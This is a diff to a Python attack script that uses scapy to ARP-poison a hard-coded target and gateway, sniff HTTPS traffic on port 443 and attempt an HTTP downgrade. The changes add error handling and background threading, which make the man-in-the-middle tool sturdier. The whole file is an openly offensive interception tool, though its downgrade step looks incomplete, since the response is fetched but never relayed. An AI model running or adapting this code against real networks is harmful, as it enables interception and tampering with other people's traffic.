@@ -1,9 +1,9 @@
+from scapy.layers.inet import IP, TCP  # Import necessary layers
+from scapy.all import ARP, Ether, srp, send, sniff
 import socket
 import threading
-import ssl
 import time
-from scapy.all import ARP, Ether, srp, sniff, send
-from http.server import BaseHTTPRequestHandler, HTTPServer
+import sys
 
 # Define the target network
 TARGET_IP = "10.0.1.33"  # Target client IP (replace with your target IP)
@@ -53,39 +53,55 @@ def handle_client(client_socket):
 
 # Start sniffing the traffic
 def packet_callback(packet):
-    if packet.haslayer(TCP) and packet.haslayer(IP):
-        if packet[TCP].dport == PORT:
-            print(f"Intercepted traffic to {TARGET_IP}:{PORT}")
+    try:
+        if packet.haslayer(TCP) and packet.haslayer(IP):
+            if packet[TCP].dport == PORT:
+                print(f"Intercepted traffic to {TARGET_IP}:{PORT}")
 
-            # Create a socket for communication
-            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_socket.connect((TARGET_IP, PORT))
+                # Create a socket for communication
+                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                client_socket.connect((TARGET_IP, PORT))
 
-            # Send HTTP instead of HTTPS
-            request = f"GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\nConnection: close\r\n\r\n"
-            client_socket.send(request.encode())
+                # Send HTTP instead of HTTPS
+                request = f"GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\nConnection: close\r\n\r\n"
+                client_socket.send(request.encode())
 
-            # Receive the response
-            response = client_socket.recv(4096)
+                # Receive the response
+                response = client_socket.recv(4096)
 
-            # Send back to the client
-            print(f"Sending downgraded HTTP response to client")
-            client_socket.close()
+                # Send back to the client
+                print(f"Sending downgraded HTTP response to client")
+                client_socket.close()
+    except Exception as e:
+        print(f"Error while handling packet: {e}")
 
 # ARP Spoofing thread
 def start_arp_spoof():
     while True:
-        arp_spoof(TARGET_IP, GATEWAY_IP)
-        time.sleep(2)
+        try:
+            arp_spoof(TARGET_IP, GATEWAY_IP)
+            time.sleep(2)
+        except Exception as e:
+            print(f"Error in ARP Spoofing: {e}")
+            break
 
 # Main function to run the attack
 def main():
-    # Start ARP poisoning
+    # Start ARP poisoning in a background thread
     arp_thread = threading.Thread(target=start_arp_spoof)
+    arp_thread.daemon = True  # Ensure the thread exits when the main program exits
     arp_thread.start()
 
-    # Start sniffing and handling packets
-    sniff(filter="tcp port 443", prn=packet_callback, store=0)
+    try:
+        # Start sniffing and handling packets
+        print("Starting sniffer...")
+        sniff(filter="tcp port 443", prn=packet_callback, store=0, stop_filter=lambda x: False)
+    except KeyboardInterrupt:
+        print("\nSniffer stopped.")
+        sys.exit(0)
+    except Exception as e:
+        print(f"Error in sniffing: {e}")
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
